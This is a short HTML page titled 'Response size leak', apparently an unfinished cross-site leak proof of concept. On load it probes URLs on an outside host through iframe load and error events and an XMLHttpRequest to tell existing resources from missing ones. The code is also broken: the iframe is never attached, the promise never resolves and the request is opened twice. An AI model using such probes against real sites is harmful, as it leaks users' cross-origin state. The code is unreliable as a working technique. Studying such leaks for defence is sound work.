<head>
  <title>Response size leak</title>
  <script>
    
    async function get_diff(url, status) {
      let start = performance.getEntries().length;
      let element = document.createElement('iframe');
      element.src = url;

      return new Promise((resolve) => {
        element.onload = () => {
          console.log('exists');
        }
        element.onerror = () => {
          console.log('does not exist');
        }
      });

    }

    async function run(url) {
      get_diff(url + 'exists');
      get_diff(url + 'does_not_exist');
      const req = new XMLHttpRequest();
      req.open("GET", 'http://ibgang.com:8880/exists');
      req.open("GET", 'http://ibgang.com:8880/does_not_exist');
      req.send();
    }
    
    onload = () => {
      run('http://ibgang.com:8880/');
    }
  </script>
</head>

<body>
</body>

</html>
